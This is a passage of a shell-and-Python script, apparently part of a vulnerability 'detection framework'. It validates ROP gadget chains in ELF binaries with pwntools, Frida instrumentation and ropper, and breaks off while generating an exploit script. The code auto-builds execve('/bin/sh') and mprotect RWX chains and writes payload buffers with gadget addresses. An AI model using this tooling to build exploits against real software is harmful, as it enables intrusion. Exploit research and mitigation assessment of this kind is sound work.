#!/bin/sh
# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — CHAIN VALIDATION  (Dynamic Instrumentation + Static ROP)
#  CRA Detection Framework | ELF x86_64 | POSIX sh
#
#  Pipeline: phase2_enhanced_catalog.json
#            phase0_vuln_report.json
#            --> [phase3] --> phase3_validated_chains.json
#                            phase3_payload_sketch.py
#
#  Architecture — replaces angr/claripy with three-layer validation:
#
#    Layer 1 — pwntools  (static, always runs)
#      Loads the ELF with pwntools, verifies each gadget address falls within
#      an executable PT_LOAD segment, and attempts to auto-build a goal-oriented
#      chain (execve / mprotect) using the pwntools ROP engine.
#      Confidence: 0.15 – 0.70   Status: PROBABLE | UNLIKELY
#
#    Layer 2 — Frida  (dynamic, requires a Phase 0 crash input)
#      Spawns the binary with the Phase 0 crash input under Frida instrumentation.
#      Interceptor hooks are placed at each gadget address before execution
#      begins.  PIE-aware: offsets are computed from the Phase 0 runtime base
#      and added to the module's live base at hook-time so ASLR rebasing is
#      handled transparently.  Register snapshots are captured at every hook.
#      Confidence: 0.20 – 0.95   Status: CONFIRMED | PROBABLE | UNLIKELY
#
#    Layer 3 — ropper  (optional, confidence bump only)
#      Independently enumerates gadgets with ropper and checks whether each
#      Phase 2 address appears in ropper's database.  A full match adds +0.08
#      to the best confidence from layers 1 / 2.  Does not change status.
#
#    Decision merge:
#      Frida (dynamic) takes priority over pwntools (static).
#      ropper boost is applied on top of whichever layer's result is used.
#      BLOCKED is always terminal — mitigation fast-path is checked first.
#
#  Validation outcomes (identical to previous Phase 3 — Phase 4 compatible):
#    CONFIRMED  Frida saw all gadgets fire in sequence            conf ≥ 0.75
#    PROBABLE   pwntools chain built or partial Frida hit         conf 0.30–0.74
#    BLOCKED    CET / stack canary detected — chain stopped       conf < 0.10
#    UNLIKELY   No validation layer succeeded                     conf < 0.30
#
#  angr removal rationale:
#    angr SimState symbolic execution consumed 2–4 GB per chain, timed out
#    frequently on real binaries due to path explosion, and produced false
#    positives when gadget preconditions were not modelled accurately.
#    Frida dynamic tracing on real crash inputs is both lighter and more
#    accurate: gadgets either fire or they do not.
#
#  Tool dependencies:
#    Required : python3
#               frida          (pip install frida frida-tools)
#               pwntools       (pip install pwntools)
#    Optional : ropper         (pip install ropper)
#
#  Usage:
#    ./phase3_chain_validation.sh -b <binary> [options]
#
#  Options:
#    -b  Target binary path                   (required)
#    -i  Phase 2 enhanced catalog             (default: ./cra_output/phase2_enhanced_catalog.json)
#    -0  Phase 0 report                       (default: ./cra_output/phase0_vuln_report.json)
#    -o  Output directory                     (default: ./cra_output)
#    -t  Per-chain validation timeout (s)     (default: 15)
#    -n  Max chains to validate               (default: 200)
#    -F  Disable Frida layer (0=on, 1=off)    (default: 0)
#    -h  Help
# ═══════════════════════════════════════════════════════════════════════════════
set -eu

RED='\033[0;31m';  GREEN='\033[0;32m';  YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m';     NC='\033[0m'

log()  { printf "${CYAN}[*]${NC} %s\n"    "$*"; }
ok()   { printf "${GREEN}[+]${NC} %s\n"   "$*"; }
warn() { printf "${YELLOW}[!]${NC} %s\n"  "$*"; }
die()  { printf "${RED}[-]${NC} %s\n" "$*" >&2; exit 1; }

BINARY=""
INPUT_CATALOG=""
PHASE0_REPORT=""
OUTPUT_DIR="./cra_output"
CHAIN_TIMEOUT=15
MAX_CHAINS=200
FRIDA_DISABLE=0

while [ $# -gt 0 ]; do
    case "$1" in
        -b) BINARY="$2";          shift 2 ;;
        -i) INPUT_CATALOG="$2";   shift 2 ;;
        -0|-p|--phase0) PHASE0_REPORT="$2"; shift 2 ;;
        -o) OUTPUT_DIR="$2";      shift 2 ;;
        -t) CHAIN_TIMEOUT="$2";   shift 2 ;;
        -n) MAX_CHAINS="$2";      shift 2 ;;
        -F) FRIDA_DISABLE="$2";   shift 2 ;;
        -h|--help) grep '^#' "$0" | sed 's/^# \{0,2\}//' && exit 0 ;;
        -*) die "Unknown option: $1" ;;
        *)  die "Unexpected argument: $1" ;;
    esac
done

[ -z "$BINARY" ]   && die "No binary specified. Use -b <binary>"
[ ! -f "$BINARY" ] && die "Binary not found: $BINARY"
[ -z "$INPUT_CATALOG" ] && INPUT_CATALOG="$OUTPUT_DIR/phase2_enhanced_catalog.json"
[ ! -f "$INPUT_CATALOG" ] && die "Phase 2 catalog not found: $INPUT_CATALOG"
[ -z "$PHASE0_REPORT" ]  && PHASE0_REPORT="$OUTPUT_DIR/phase0_vuln_report.json"

if command -v realpath >/dev/null 2>&1; then
    BINARY_ABS=$(realpath "$BINARY")
else
    BINARY_ABS=$(readlink -f "$BINARY" 2>/dev/null \
        || ( cd "$(dirname "$BINARY")" && printf '%s/%s' "$(pwd)" "$(basename "$BINARY")"))
fi

mkdir -p "$OUTPUT_DIR"
OUTPUT_FILE="$OUTPUT_DIR/phase3_validated_chains.json"
PAYLOAD_FILE="$OUTPUT_DIR/phase3_payload_sketch.py"

printf "\n"
printf "${BOLD}%s${NC}\n" "======================================================="
printf "${BOLD}  CRA Detection -- Phase 3: Chain Validation${NC}\n"
printf "${BOLD}  Backend: frida + pwntools + ropper${NC}\n"
printf "${BOLD}%s${NC}\n" "======================================================="
printf "\n"
log "Binary    : $BINARY_ABS"
log "Catalog   : $INPUT_CATALOG"
log "Phase 0   : $PHASE0_REPORT"
log "Timeout   : ${CHAIN_TIMEOUT}s / chain  |  Max chains: $MAX_CHAINS"
log "Frida     : $([ "$FRIDA_DISABLE" = "1" ] && echo DISABLED || echo ENABLED)"
printf "\n"

# ── Tool checks ───────────────────────────────────────────────────────────
command -v python3 >/dev/null 2>&1 || die "python3 not found"

python3 -c "import frida" 2>/dev/null \
    || { [ "$FRIDA_DISABLE" = "0" ] \
         && warn "frida not found — dynamic layer will be skipped. Run: pip install frida frida-tools"; }

python3 -c "from pwn import ELF, ROP, p64" 2>/dev/null \
    || die "pwntools not found. Run: pip install pwntools"

python3 -c "from ropper import RopperService" 2>/dev/null \
    || warn "ropper not found (optional). Run: pip install ropper"

printf "\n"

# ─────────────────────────────────────────────────────────────────────────
python3 - \
    "$BINARY_ABS" \
    "$INPUT_CATALOG" \
    "${PHASE0_REPORT}" \
    "$OUTPUT_FILE" \
    "$PAYLOAD_FILE" \
    "$CHAIN_TIMEOUT" \
    "$MAX_CHAINS" \
    "$FRIDA_DISABLE" \
<< 'PYEOF'
import sys, os, re, json, gc, time, threading, subprocess
from collections import defaultdict
from datetime import datetime

binary        = sys.argv[1]
catalog_path  = sys.argv[2]
p0_path       = sys.argv[3]
output_path   = sys.argv[4]
payload_path  = sys.argv[5]
CHAIN_TIMEOUT = int(sys.argv[6])
MAX_CHAINS    = int(sys.argv[7])
FRIDA_DISABLE = (sys.argv[8] == "1")

# ══════════════════════════════════════════════════════════════════════════
#  Tool availability flags
# ══════════════════════════════════════════════════════════════════════════
HAVE_FRIDA    = False
HAVE_PWNTOOLS = False
HAVE_ROPPER   = False

if not FRIDA_DISABLE:
    try:
        import frida as _frida_mod
        HAVE_FRIDA = True
    except ImportError:
        print("  [!] frida import failed — dynamic layer disabled")

try:
    import pwn as _pwn
    from pwn import ELF, ROP, p64, u64
    _pwn.context.arch      = "amd64"
    _pwn.context.log_level = "error"
    HAVE_PWNTOOLS = True
except ImportError:
    print("  [!] pwntools import failed — static layer limited")

try:
    from ropper import RopperService as _RopperService
    HAVE_ROPPER = True
except ImportError:
    pass

print("  [*] Tool layers: frida=%s  pwntools=%s  ropper=%s"
      % (HAVE_FRIDA, HAVE_PWNTOOLS, HAVE_ROPPER))

GPR64 = ["rax","rbx","rcx","rdx","rsi","rdi","rbp","rsp",
         "r8","r9","r10","r11","r12","r13","r14","r15"]

# ── Memory util ───────────────────────────────────────────────────────────
def mem_mb():
    try:
        with open("/proc/self/status") as fh:
            for line in fh:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) // 1024
    except Exception:
        pass
    return 0

# ══════════════════════════════════════════════════════════════════════════
#  Phase 0 context loader
# ══════════════════════════════════════════════════════════════════════════
def load_phase0(path):
    stub = {
        "vuln_id": "", "vuln_type": "UNKNOWN",
        "write_primitive": "UNKNOWN", "controlled_offset": None,
        "controlled_registers": [], "crash_input": None,
        "fault_address": "0x0", "memory_map": [],
        "base_addresses": {}, "notes": "",
        "runtime_env": {
            "aslr_level": 2, "pie_binary": True,
            "stack_canary": False, "nx_enabled": True,
            "full_relro": False, "cet_ibt": False, "cet_shstk": False,
        },
    }
    if not os.path.exists(path):
        print("  [!] Phase 0 report not found — using stub context")
        print("      Run phase0_vuln_detection.sh first for real data.")
        return stub
    with open(path) as fh:
        p0 = json.load(fh)
    vulns = p0.get("vulnerabilities", [])
    pri   = {"HIGH": 3, "MEDIUM": 2, "LOW": 1, "UNKNOWN": 0}
    best  = max(vulns,
                key=lambda v: pri.get(v.get("exploitability", ""), 0),
                default=None)
    if not best:
        print("  [!] Phase 0 has no vulnerabilities — using stub")
        return stub

    # Pull phase0_base_addresses from Phase 1 catalog metadata
    base_addresses = {}
    try:
        with open(catalog_path) as cf:
            for line in cf:
                if '"phase0_base_addresses"' in line:
                    val = line.split(":", 1)[1].strip().rstrip(",").strip()
                    base_addresses = json.loads(val)
                    break
    except Exception:
        pass

    env = p0.get("runtime_env", stub["runtime_env"])
    env.setdefault("cet_ibt",  False)
    env.setdefault("cet_shstk", False)

    return {
        "vuln_id":             best.get("vuln_id", ""),
        "vuln_type":           best.get("vuln_type", "UNKNOWN"),
        "write_primitive":     best.get("write_primitive", "UNKNOWN"),
        "controlled_offset":   best.get("controlled_offset"),
        "controlled_registers":best.get("controlled_registers", []),
        "crash_input":         best.get("crash_input"),
        "fault_address":       best.get("fault_address", "0x0"),
        "memory_map":          best.get("memory_map", []),
        "base_addresses":      base_addresses,
        "notes":               best.get("notes", ""),
        "runtime_env":         env,
        # input_mode stored by phase 0
        "input_mode":          p0.get("input_mode", "file"),
    }

# ══════════════════════════════════════════════════════════════════════════
#  Phase 2 catalog streaming helpers  (unchanged)
# ══════════════════════════════════════════════════════════════════════════
KEEP = {"gadget_id", "sink_address", "sink_type", "semantic_tags",
        "has_syscall", "has_mem_write", "has_stack_manip",
        "reg_inputs", "reg_outputs", "chain_length",
        "exploitability_hint", "function", "duplicate_count",
        "sink_instruction"}

def iter_gadgets(path):
    decoder = json.JSONDecoder()
    with open(path) as fh:
        buf = ""; in_array = False
        for raw in fh:
            buf += raw
            if not in_array:
                idx = buf.find('"gadgets"')
                if idx == -1: continue
                br = buf.find("[", idx)
                if br == -1: continue
                buf = buf[br + 1:]; in_array = True
            while True:
                buf = buf.lstrip()
                if not buf: break
                if buf[0] in ("]", "}"): return
                if buf[0] == ",": buf = buf[1:]; continue
                try:
                    obj, end = decoder.raw_decode(buf)
                    buf = buf[end:]
                    yield {k: v for k, v in obj.items() if k in KEEP}
                except json.JSONDecodeError:
                    break

def load_meta_depgraph(path):
    lines = []
    with open(path) as fh:
        for line in fh:
            if line.strip().startswith('"gadgets"'): break
            lines.append(line)
    text = "".join(lines).rstrip().rstrip(",") + "\n}"
    try:    meta = json.loads(text)
    except Exception: meta = {}
    dep = meta.pop("dependency_graph", [])
    return meta, dep

# ══════════════════════════════════════════════════════════════════════════
#  Goal inference  (unchanged)
# ══════════════════════════════════════════════════════════════════════════
def infer_goal(tags):
    ts = set(tags)
    if "SYSCALL"     in ts: return "SYSCALL_EXECUTION"
    if "MEM_WRITE"   in ts: return "ARBITRARY_MEM_WRITE"
    if "STACK_MANIP" in ts: return "STACK_PIVOT_ROP"
    if "MEM_READ"    in ts: return "INFORMATION_DISCLOSURE"
    return "CONTROL_FLOW_HIJACK"

# ══════════════════════════════════════════════════════════════════════════
#  pwntools ELF cache
# ══════════════════════════════════════════════════════════════════════════
_elf_cache = {}

def get_elf(path):
    if path not in _elf_cache:
        if not HAVE_PWNTOOLS:
            _elf_cache[path] = None
            return None
        try:
            _elf_cache[path] = ELF(path, checksec=False)
        except Exception as exc:
            print("  [!] pwntools ELF load failed: %s" % exc)
            _elf_cache[path] = None
    return _elf_cache[path]

def elf_exec_segments(elf_obj):
    """Return list of (seg_start, seg_end) for executable PT_LOAD segments."""
    segs = []
    try:
        for seg in elf_obj.segments:
            if seg.header.p_type == "PT_LOAD" and (seg.header.p_flags & 0x1):
                start = elf_obj.address + seg.header.p_vaddr
                end   = start + seg.header.p_filesz
                segs.append((start, end))
    except Exception:
        pass
    return segs

# ══════════════════════════════════════════════════════════════════════════
#  LAYER 1 — pwntools static validation
#
#  Checks performed:
#   (a) Each gadget address falls within an executable PT_LOAD segment.
#   (b) pwntools ROP engine attempts an auto-built goal chain
#       (execve / mprotect / raw gadget bytes).
#   (c) At least one RET-sink gadget present (basic chain sanity).
#
#  Confidence is computed as a weighted sum of checks (a)+(b)+(c), capped
#  at 0.70 so CONFIRMED can only be awarded by the Frida dynamic layer.
# ══════════════════════════════════════════════════════════════════════════
def validate_layer1_pwntools(chain_gads, p0_ctx):
    """Returns (status, confidence, concrete_vals, notes)."""
    if not HAVE_PWNTOOLS:
        return "UNLIKELY", 0.20, {}, "pwntools not installed"

    elf = get_elf(binary)
    if elf is None:
        return "UNLIKELY", 0.15, {}, "pwntools ELF load failed"

    env    = p0_ctx["runtime_env"]
    is_pie = env.get("pie_binary", True)
    goal   = infer_goal([t for g in chain_gads
                         for t in g.get("semantic_tags", [])])

    # Rebase ELF to Phase 0 runtime base so addresses match Phase 2 values
    if is_pie:
        p0_base = 0x400000
        for m in p0_ctx.get("memory_map", []):
            pth = m.get("path", "")
            if binary in pth or os.path.basename(binary) in pth:
                try:   p0_base = int(m["start"], 16); break
                except Exception: pass
        elf.address = p0_base

    segs     = elf_exec_segments(elf)
    concrete = {}
    notes    = []
    conf     = 0.0

    # (a) Segment range check
    in_exec = 0
    for g in chain_gads:
        try:
            addr = int(g["sink_address"], 16)
            if any(lo <= addr < hi for lo, hi in segs):
                in_exec += 1
        except Exception:
            pass
    seg_cov = in_exec / max(len(chain_gads), 1)
    conf   += 0.35 * seg_cov
    notes.append("seg_cov=%.0f%%" % (seg_cov * 100))

    # (b) ROP auto-build attempt
    chain_bytes = b""
    try:
        rop = ROP(elf)

        if goal == "SYSCALL_EXECUTION":
            rop.execve(b"/bin/sh\x00", 0, 0)
            chain_bytes = rop.chain()
            conf       += 0.25
            concrete    = {"rax": hex(59), "rsi": "0x0", "rdx": "0x0"}
            notes.append("pwntools_execve=%dB" % len(chain_bytes))

        elif goal == "ARBITRARY_MEM_WRITE":
            rop.mprotect(0x400000, 0x1000, 7)
            chain_bytes = rop.chain()
            conf       += 0.20
            concrete    = {"rax": hex(10)}
            notes.append("pwntools_mprotect=%dB" % len(chain_bytes))

        else:
            # Build raw chain from Phase 2 addresses as fallback
            chain_bytes = b"".join(
                p64(int(g["sink_address"], 16))
                for g in chain_gads
                if g.get("sink_address") and g["sink_address"] != "0x0"
            )
            if chain_bytes:
                conf  += 0.10
                notes.append("raw_chain=%dB" % len(chain_bytes))

    except Exception as exc:
        # pwntools ROP auto-build failed; try raw chain only
        try:
            chain_bytes = b"".join(
                p64(int(g["sink_address"], 16))
                for g in chain_gads
                if g.get("sink_address") and g["sink_address"] != "0x0"
            )
            if chain_bytes:
                conf  += 0.05
                notes.append("raw_fallback=%dB" % len(chain_bytes))
        except Exception:
            pass
        notes.append("rop_build_fail(%s)" % str(exc)[:40])

    # (c) Sanity: at least one RET sink
    ret_sinks = sum(1 for g in chain_gads if g.get("sink_type") == "RET")
    if ret_sinks:
        conf  += 0.05
        notes.append("ret_sinks=%d" % ret_sinks)

    conf   = round(min(conf, 0.70), 3)
    status = "PROBABLE" if conf >= 0.25 else "UNLIKELY"
    return status, conf, concrete, "  ".join(notes)

# ══════════════════════════════════════════════════════════════════════════
#  LAYER 2 — Frida dynamic tracing
#
#  Execution flow:
#   1. Compute gadget hook addresses:
#        non-PIE → raw addresses from Phase 2
#        PIE     → compute offset from Phase 0 base; Frida JS adds live base
#   2. Spawn or attach the binary with the Phase 0 crash input.
#   3. Load the Frida JS interceptor before resuming execution.
#   4. Wait up to CHAIN_TIMEOUT seconds for hooks to fire.
#   5. Evaluate: ALL hit → CONFIRMED; PARTIAL → PROBABLE; NONE → UNLIKELY.
#
#  The Frida JS uses Process.getModuleByName() to find the live base address
#  at hook-time, making it resilient to ASLR on every run.
# ══════════════════════════════════════════════════════════════════════════

# ── Frida JavaScript template ─────────────────────────────────────────────
_FRIDA_JS_TMPL = r"""
'use strict';
(function () {
    var IS_PIE   = {IS_PIE};
    var OFFSETS  = {OFFSETS};      /* int offsets (PIE) or absolute addrs */
    var MOD_NAME = '{MOD_NAME}';

    var gadgetPtrs = [];
    if (IS_PIE) {
        var liveBase;
        try {
            liveBase = Module.getBaseAddress(MOD_NAME);
        } catch (e) {
            liveBase = Process.enumerateModules()[0].base;
        }
        gadgetPtrs = OFFSETS.map(function (o) { return liveBase.add(o); });
    } else {
        gadgetPtrs = OFFSETS.map(function (a) { return ptr(a); });
    }

    var hitOrder = [];   /* idx values in the order hooks fired */
    var regSnaps = {};   /* idx -> register snapshot dict        */

    gadgetPtrs.forEach(function (ptrAddr, idx) {
        try {
            Interceptor.attach(ptrAddr, {
                onEnter: function () {
                    var c = this.context;
                    var snap = {
                        rax: c.rax.toString(),  rbx: c.rbx.toString(),
                        rcx: c.rcx.toString(),  rdx: c.rdx.toString(),
                        rsi: c.rsi.toString(),  rdi: c.rdi.toString(),
                        rbp: c.rbp.toString(),  rsp: c.rsp.toString(),
                        r8:  c.r8.toString(),   r9:  c.r9.toString(),
                        r10: c.r10.toString(),  r11: c.r11.toString(),
                        r12: c.r12.toString(),  r13: c.r13.toString(),
                        r14: c.r14.toString(),  r15: c.r15.toString(),
                        rip: c.pc.toString(),
                    };
                    hitOrder.push(idx);
                    if (!regSnaps[idx]) { regSnaps[idx] = snap; }
                    send({ ev: 'hit', idx: idx,
                           addr: ptrAddr.toString(), regs: snap });
                }
            });
        } catch (e) {
            send({ ev: 'hook_fail', idx: idx,
                   addr: ptrAddr.toString(), err: e.message });
        }
    });

    send({ ev: 'ready', total: gadgetPtrs.length });
})();
"""

def _build_frida_js(chain_gads, p0_ctx):
    """
    Fill the Frida JS template with correct offsets / addresses.
    For PIE: passes integer offsets from the Phase 0 base.
    For non-PIE: passes raw absolute addresses.
    """
    env    = p0_ctx["runtime_env"]
    is_pie = env.get("pie_binary", True)
    mod    = os.path.basename(binary)

    if is_pie:
        p0_base = 0x400000
        for m in p0_ctx.get("memory_map", []):
            pth = m.get("path", "")
            if binary in pth or mod in pth:
                try:   p0_base = int(m["start"], 16); break
                except Exception: pass
        payload = []
        for g in chain_gads:
            try:
                payload.append(int(g["sink_address"], 16) - p0_base)
            except Exception:
                payload.append(0)
        is_pie_js  = "true"
        offsets_js = json.dumps(payload)
    else:
        payload = []
        for g in chain_gads:
            try:   payload.append(int(g["sink_address"], 16))
            except Exception: payload.append(0)
        is_pie_js  = "false"
        offsets_js = json.dumps(["0x%x" % a for a in payload])

    return (_FRIDA_JS_TMPL
            .replace("{IS_PIE}",   is_pie_js)
            .replace("{OFFSETS}",  offsets_js)
            .replace("{MOD_NAME}", mod))


def validate_layer2_frida(chain_gads, p0_ctx):
    """
    Dynamic validation using Frida instrumentation.
    Returns (status, confidence, concrete_regs, notes).
    Returns (None, 0.0, {}, reason) when the layer cannot run.
    """
    if not HAVE_FRIDA:
        return None, 0.0, {}, "frida not installed"

    crash_input  = p0_ctx.get("crash_input")
    input_mode   = p0_ctx.get("input_mode", "file")

    if not crash_input or not os.path.exists(crash_input):
        return None, 0.0, {}, "no crash input file — frida layer skipped"

    js_code    = _build_frida_js(chain_gads, p0_ctx)
    n_gadgets  = len(chain_gads)
    hits       = {}      # idx → first register snapshot
    hook_errors= []
    ready_evt  = threading.Event()

    def on_message(msg, _data):
        if msg.get("type") != "send":
            return
        pl  = msg.get("payload", {})
        ev  = pl.get("ev", "")
        if ev == "ready":
            ready_evt.set()
        elif ev == "hit":
            idx = pl.get("idx", -1)
            if idx >= 0 and idx not in hits:
                hits[idx] = pl.get("regs", {})
        elif ev == "hook_fail":
            hook_errors.append("%s: %s" % (pl.get("addr","?"), pl.get("err","?")))

    session = None
    pid     = None
    proc    = None

    try:
        device = _frida_mod.get_local_device()

        if input_mode == "stdin":
            # Launch via subprocess so we control stdin pipe,
            # then attach Frida to the running PID.
            crash_data = open(crash_input, "rb").read()
            proc = subprocess.Popen(
                [binary],
                stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pid     = proc.pid
            session = _frida_mod.attach(pid)
            script  = session.create_script(js_code)
            script.on("message", on_message)
            script.load()
            # Block until Frida JS signals 'ready' (hooks installed)
            if not ready_evt.wait(5.0):
                raise RuntimeError("Frida JS did not signal ready")
            # Write crash payload — binary now reads and (should) crash
            try:
                proc.stdin.write(crash_data)
                proc.stdin.flush()
                proc.stdin.close()
            except Exception:
                pass

        elif input_mode == "arg":
            crash_arg = open(crash_input).read().strip()
            pid       = device.spawn([binary, crash_arg])
            session   = device.attach(pid)
            script    = session.create_script(js_code)
            script.on("message", on_message)
            script.load()
            if not ready_evt.wait(5.0):
                raise RuntimeError("Frida JS did not signal ready")
            device.resume(pid)

        else:  # file mode (default)
            pid     = device.spawn([binary, crash_input])
            session = device.attach(pid)
            script  = session.create_script(js_code)
            script.on("message", on_message)
            script.load()
            if not ready_evt.wait(5.0):
                raise RuntimeError("Frida JS did not signal ready")
            device.resume(pid)

        # Give the binary time to crash and trigger hooks
        time.sleep(min(CHAIN_TIMEOUT, 12))

    except Exception as exc:
        hook_errors.append("spawn/attach: %s" % str(exc)[:150])
    finally:
        try:
            if session: session.detach()
        except Exception: pass
        try:
            if proc:
                proc.kill()
                proc.wait(timeout=2)
        except Exception: pass
        try:
            if pid and not proc:
                device.kill(pid)
        except Exception:
            try:
                import signal as _sig
                os.kill(pid, _sig.SIGKILL)
            except Exception: pass

    # ── Evaluate results ──────────────────────────────────────────────────
    n_hit    = len(hits)
    coverage = n_hit / max(n_gadgets, 1)

    if hook_errors and not hits:
        return ("UNLIKELY", 0.15, {},
                "frida errors: %s" % "; ".join(hook_errors[:2]))

    if n_hit == 0:
        msg = "frida: 0/%d gadgets hit during execution" % n_gadgets
        if hook_errors:
            msg += "  (%s)" % hook_errors[0][:60]
        return "UNLIKELY", 0.20, {}, msg

    final_regs = hits.get(max(hits.keys()), {})

    if n_hit == n_gadgets:
        # All gadgets fired — check order
        hit_keys   = sorted(hits.keys())
        sequential = (hit_keys == list(range(n_gadgets)))
        conf       = 0.93 if sequential else 0.81
        return ("CONFIRMED", conf, final_regs,
                "frida: all %d/%d hit%s"
                % (n_hit, n_gadgets, " in order" if sequential else " (unordered)"))

    # Partial hit — PROBABLE with proportional confidence
    conf = round(min(0.30 + 0.38 * coverage, 0.73), 3)
    return ("PROBABLE", conf, final_regs,
            "frida: %d/%d gadgets hit (%.0f%%)"
            % (n_hit, n_gadgets, coverage * 100))

# ══════════════════════════════════════════════════════════════════════════
#  LAYER 3 — ropper cross-validation  (optional confidence boost)
#
#  Loads the binary into ropper once (cached), builds its gadget database,
#  then checks each Phase 2 sink address against that database.
#  Returns the fraction confirmed (0.0–1.0) or None if ropper unavailable.
# ══════════════════════════════════════════════════════════════════════════
_ropper_addr_cache = None

def ropper_verify_fraction(chain_gads):
    """Return fraction of gadget addresses confirmed by ropper, or None."""
    global _ropper_addr_cache
    if not HAVE_ROPPER:
        return None

    if _ropper_addr_cache is None:
        try:
            rs = _RopperService(
                options={"type": "rop", "inst_count": 6,
                         "color": False, "badbytes": ""}
            )
            rs.addFile(binary)
            rs.loadGadgetsFor()
            rf = rs.getFileFor(binary)
            _ropper_addr_cache = {g.address for g in rf.gadgets}
            print("  [*] ropper: %d gadgets indexed" % len(_ropper_addr_cache))
        except Exception as exc:
            print("  [!] ropper init: %s" % str(exc)[:80])
            _ropper_addr_cache = set()

    if not _ropper_addr_cache:
        return None

    verified = 0
    for g in chain_gads:
        try:
            if int(g["sink_address"], 16) in _ropper_addr_cache:
                verified += 1
        except Exception:
            pass
    return verified / max(len(chain_gads), 1)

# ══════════════════════════════════════════════════════════════════════════
#  Combined chain validation — merges all three layers
# ══════════════════════════════════════════════════════════════════════════
STATUS_RANK = {"CONFIRMED": 4, "PROBABLE": 3, "UNLIKELY": 2, "BLOCKED": 1}

def validate_chain(chain_gads, p0_ctx):
    """
    Run mitigation check → Layer 1 (pwntools) → Layer 2 (Frida) →
    Layer 3 (ropper boost) and return the best merged result dict.
    """
    env  = p0_ctx["runtime_env"]
    goal = infer_goal([t for g in chain_gads
                       for t in g.get("semantic_tags", [])])

    # ── Mitigation fast-path ──────────────────────────────────────────────
    blocks = []
    for g in chain_gads:
        sink = g.get("sink_type", "RET")
        if env.get("cet_shstk") and sink == "RET":
            blocks.append("CET Shadow Stack prevents RET gadget hijack")
        if env.get("cet_ibt") and sink in ("JMP", "CALL"):
            blocks.append("CET IBT restricts indirect-branch targets")
        if env.get("stack_canary") and sink == "RET":
            blocks.append("Stack canary detects overwrite before RET executes")

    if blocks:
        return {
            "status":       "BLOCKED",
            "confidence":   0.03,
            "concrete_vals":{},
            "block_reasons":list(set(blocks)),
            "error":        "",
            "goal":         goal,
            "layer_used":   "mitigation_fast_path",
        }

    # ── Layer 1: pwntools static ──────────────────────────────────────────
    l1_status, l1_conf, l1_concrete, l1_notes = \
        validate_layer1_pwntools(chain_gads, p0_ctx)
    print("       L1 pwntools : %-10s  conf=%.3f  %s"
          % (l1_status, l1_conf, l1_notes[:70]))

    # ── Layer 2: Frida dynamic ────────────────────────────────────────────
    l2_status, l2_conf, l2_concrete, l2_notes = \
        validate_layer2_frida(chain_gads, p0_ctx)
    if l2_status is not None:
        print("       L2 frida     : %-10s  conf=%.3f  %s"
              % (l2_status, l2_conf, l2_notes[:70]))
    else:
        print("       L2 frida     : SKIPPED  (%s)" % l2_notes[:70])

    # ── Layer 3: ropper confidence boost ─────────────────────────────────
    ropper_frac  = ropper_verify_fraction(chain_gads)
    ropper_boost = 0.0
    if ropper_frac is not None:
        ropper_boost = round(0.08 * ropper_frac, 4)
        print("       L3 ropper    : %.0f%% verified  boost=+%.3f"
              % (ropper_frac * 100, ropper_boost))

    # ── Merge: Frida > pwntools (dynamic beats static) ───────────────────
    if l2_status and STATUS_RANK.get(l2_status, 0) >= STATUS_RANK.get(l1_status, 0):
        best_status   = l2_status
        best_conf     = l2_conf
        best_concrete = l2_concrete or l1_concrete
        best_layer    = "frida"
        best_error    = l2_notes
    else:
        best_status   = l1_status
        best_conf     = l1_conf
        best_concrete = l1_concrete
        best_layer    = "pwntools"
        best_error    = l1_notes

    # Apply ropper boost (capped at 1.0)
    final_conf = round(min(best_conf + ropper_boost, 1.0), 3)

    return {
        "status":        best_status,
        "confidence":    final_conf,
        "concrete_vals": best_concrete,
        "block_reasons": [],
        "error":         best_error,
        "goal":          goal,
        "layer_used":    best_layer,
    }

# ══════════════════════════════════════════════════════════════════════════
#  Payload sketch generator  (pwntools-based, replaces angr version)
#
#  Writes a ready-to-run pwntools exploit script that:
#    - Imports ELF + ROP from the target binary
#    - Lists Phase 2 gadget addresses with function + tag annotations
#    - Shows the pwntools auto-built chain (if any) as a reference comment
#    - Inserts Frida-captured concrete register values
#    - Constructs the full payload buffer (offset padding + gadget chain)
#    - Includes goal-specific stubs (execve setup, mprotect, etc.)
# ══════════════════════════════════════════════════════════════════════════
def gen_payload(chain_gads, val_res, p0_ctx):
    offset    = p0_ctx.get("controlled_offset")
    primitive = p0_ctx.get("write_primitive", "UNKNOWN")
    env       = p0_ctx["runtime_env"]
    concrete  = val_res.get("concrete_vals", {})
    goal      = val_res.get("goal", "UNKNOWN")
    bin_name  = os.path.basename(binary)

    # Attempt pwntools auto-chain for payload reference section
    rop_dump = ""
    if HAVE_PWNTOOLS:
        try:
            elf = get_elf(binary)
            if elf:
                rop_eng = ROP(elf)
                if goal == "SYSCALL_EXECUTION":
                    rop_eng.execve(b"/bin/sh\x00", 0, 0)
                    rop_dump = rop_eng.dump()
                elif goal == "ARBITRARY_MEM_WRITE":
                    rop_eng.mprotect(0x400000, 0x1000, 7)
                    rop_dump = rop_eng.dump()
        except Exception:
            pass

    L = [
        "#!/usr/bin/env python3",
        "# ── CRA Framework Phase 3 — pwntools payload sketch ──────────────────",
        "# GOAL        : %s"  % goal,
        "# PRIMITIVE   : %s"  % primitive,
        "# OFFSET      : %s"  % (str(offset) if offset is not None else "UNKNOWN"),
        "# VALIDATED   : %s"  % val_res.get("layer_used", "static"),
        "# CONFIDENCE  : %.3f" % val_res.get("confidence", 0.0),
        "# ASLR        : level=%d  PIE=%s  canary=%s  CET=%s" % (
            env.get("aslr_level", 2),
            env.get("pie_binary", True),
            env.get("stack_canary", False),
            env.get("cet_shstk", False) or env.get("cet_ibt", False)),
        "# NOTE        : If ASLR is active, obtain a base-address leak and",
        "#               add it to every gadget address before sending.",
        "# ─────────────────────────────────────────────────────────────────────",
        "",
        "from pwn import *",
        "",
        "context(arch='amd64', os='linux', log_level='debug')",
        "elf = ELF('./%s')" % bin_name,
        "rop = ROP(elf)",
        "",
        "# ── Gadget addresses (from Phase 2) ──────────────────────────────────",
    ]

    for i, g in enumerate(chain_gads):
        tags = " | ".join(g.get("semantic_tags", [])[:2])
        L.append("G%d = %s  # %-30s  [%s]" % (
            i + 1,
            g.get("sink_address", "0x0"),
            g.get("function", "?"),
            tags))

    if rop_dump:
        L += [
            "",
            "# ── pwntools auto-built reference chain ──────────────────────────",
            "# " + rop_dump.replace("\n", "\n# "),
        ]

    if concrete:
        L += [
            "",
            "# ── Frida-captured concrete register values at crash ─────────────",
